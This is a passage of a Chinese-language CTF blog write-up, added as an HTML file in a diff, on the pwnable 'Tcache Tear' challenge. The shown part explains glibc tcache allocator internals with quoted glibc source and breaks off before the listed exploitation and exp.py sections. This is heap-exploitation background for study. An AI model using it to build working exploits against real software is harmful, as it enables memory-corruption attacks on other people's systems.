@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 前言记录一下pwnable中Tcache Tear的解题过程中利用到的知识和遇到的问题。 0x02 Tcachetcache是在glibc-2.26中增加的一种新的内存管理机制，其目的是用于加速malloc分配。它的优先级最高，在内存分配中会得到优先处理。由于它的加入使得现在的内存分配、回收与之前有了一定的区别，同时也产生了一些新的安全问题。 总体框架从源码中的宏定义中可以看出，tcac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="tcache_tear">
+<meta property="og:url" content="https://blog.quincy.codes/2019/11/17/Tcache_Tear/index.html">
+<meta property="og:site_name" content="Quincy&#39;s blog">
+<meta property="og:description" content="0x01 前言记录一下pwnable中Tcache Tear的解题过程中利用到的知识和遇到的问题。 0x02 Tcachetcache是在glibc-2.26中增加的一种新的内存管理机制，其目的是用于加速malloc分配。它的优先级最高，在内存分配中会得到优先处理。由于它的加入使得现在的内存分配、回收与之前有了一定的区别，同时也产生了一些新的安全问题。 总体框架从源码中的宏定义中可以看出，tcac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/17/Mr3EEq.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/17/Mr86m9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/11/17/MrtBNR.png">
+<meta property="article:published_time" content="2019-11-17T01:50:40.000Z">
+<meta property="article:modified_time" content="2020-03-17T03:15:54.751Z">
+<meta property="article:author" content="Quincy">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/11/17/Mr3EEq.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>tcache_tear</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/11/20/applestore/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/10/27/ECShop%202.x:3.x%20SQL%E6%B3%A8%E5%85%A5:%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.quincy.codes/2019/11/17/Tcache_Tear/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&text=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&is_video=false&description=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=tcache_tear&body=Check out this article: https://blog.quincy.codes/2019/11/17/Tcache_Tear/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&title=tcache_tear" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.quincy.codes/2019/11/17/Tcache_Tear/&name=tcache_tear&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-前言"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Tcache"><span class="toc-number">2.</span> <span class="toc-text">0x02 Tcache</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#总体框架"><span class="toc-number">2.1.</span> <span class="toc-text">总体框架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数据结构"><span class="toc-number">2.2.</span> <span class="toc-text">数据结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#相关函数"><span class="toc-number">2.3.</span> <span class="toc-text">相关函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆管理的细节"><span class="toc-number">2.4.</span> <span class="toc-text">堆管理的细节</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#内存分配"><span class="toc-number">2.4.1.</span> <span class="toc-text">内存分配</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#内存释放"><span class="toc-number">2.4.2.</span> <span class="toc-text">内存释放</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Tcache-Tear"><span class="toc-number">3.</span> <span class="toc-text">0x03 Tcache_Tear</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序功能描述"><span class="toc-number">3.1.</span> <span class="toc-text">程序功能描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析及利用"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞分析及利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#所遇问题"><span class="toc-number">3.3.</span> <span class="toc-text">所遇问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-py"><span class="toc-number">3.4.</span> <span class="toc-text">exp.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考链接"><span class="toc-number">4.</span> <span class="toc-text">0x04 参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        tcache_tear
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Quincy's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-17T01:50:40.000Z" itemprop="datePublished">2019-11-17</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pwn/">pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>记录一下<code>pwnable</code>中<code>Tcache Tear</code>的解题过程中利用到的知识和遇到的问题。</p>
+<h2 id="0x02-Tcache"><a href="#0x02-Tcache" class="headerlink" title="0x02 Tcache"></a>0x02 Tcache</h2><p><code>tcache</code>是在<code>glibc-2.26</code>中增加的一种新的内存管理机制，其目的是用于加速malloc分配。它的优先级最高，在内存分配中会得到优先处理。由于它的加入使得现在的内存分配、回收与之前有了一定的区别，同时也产生了一些新的安全问题。</p>
+<h3 id="总体框架"><a href="#总体框架" class="headerlink" title="总体框架"></a>总体框架</h3><p>从源码中的宏定义中可以看出，<code>tcache</code>结构中总共有64个<code>bin</code>，其中每个<code>bin</code>中最多含有7个<code>chunk</code>。其可容纳的最大内存块为<code>1032 bytes</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When "x" is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When "x" is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><code>tcache</code>定义了两个新的结构，<code>tcache_entry</code>和<code>tcache_perthread_struct</code>。</p>
+<p><code>tcache_perthread_struct</code>是每个线程中<code>tcache</code>的主体。其中<code>counts</code>用于记录每个<code>bin</code>中含有的<code>chunk</code>个数，<code>entries</code>用于记录每个<code>idx</code>中的第一个<code>chunk</code>的地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+
+<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p><code>tcache</code>由<code>tcache_put()</code>和<code>cache_get()</code>两个函数来分别完成其放入、移出操作。其实现细节和<code>fastbin</code>很相似。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出<code>tcache_put()</code>的操作如下：</p>
+<ul>
+<li>首先检验准备放入的<code>chunk</code>大小是否小于<code>tcache</code>所容纳的最大<code>chunk</code>大小。</li>
+<li>若大小满足，完成相应的链表操作。将对应的<code>chunk</code>放入一个位置即入口位置。</li>
+<li>增加相应<code>bin</code>的数目</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出<code>tcache_ge t()</code>的操作如下：</p>
+<ul>
+<li>首先检验所需<code>chunk</code>大小是否满足、再检验对应的<code>bin</code>中是否有<code>chunk</code>剩余</li>
+<li>若有<code>chunk</code>，将其取出更新入口地址</li>
+<li>返回对应的<code>chunk</code></li>
+</ul>
+<h3 id="堆管理的细节"><a href="#堆管理的细节" class="headerlink" title="堆管理的细节"></a>堆管理的细节</h3><h4 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h4><p><code>__libc_malloc()</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在进行堆分配的时候，首先检查<code>tcache</code>中是否存在满足的<code>chunk</code>，若有则从中取出相应的<code>chunk</code>并返回，否则，通过<code>_int_malloc()</code>来完成相应的内存的分配操作。</p>
+<p><code>_int_malloc()</code></p>
+<p>在<code>_int_malloc()</code>进行内存分配的时候，有多处会将<code>chunk</code>移入<code>tcache</code>中：</p>
+<ul>
+<li><p>从<code>fastbin</code>分配出合适的<code>chunk</code>之后，<code>fastbin</code>中该<code>chunk</code>所在的<code>bin</code>的其余<code>chunks</code>会放入<code>tcache</code>中，直到对应的<code>tcache bin</code>放满。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">  </span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (pp = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>同样的，从<code>smallbin</code>中分配出合适的<code>chunk</code>之后，也会执行相应的操作。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在遍历<code>unsorted_bin</code>寻找合适<code>chunk</code>时：</p>
+<ul>
+<li>当找到大小合适的<code>chunk</code>时，并不直接返回，而是先放到tcache中，并且设置<code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code>，继续处理。</li>
+<li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面。</li>
+<li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">size</span> == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span>  </span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="comment">/* 遍历 unsorted bin的最后，会根据 return_cached判断是否有 大小适配的 unsorted bin 进入了 tcache ， 由于 mp_.tcache_unsorted_limit默认为 0 ，所以不会进入分支。 */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span 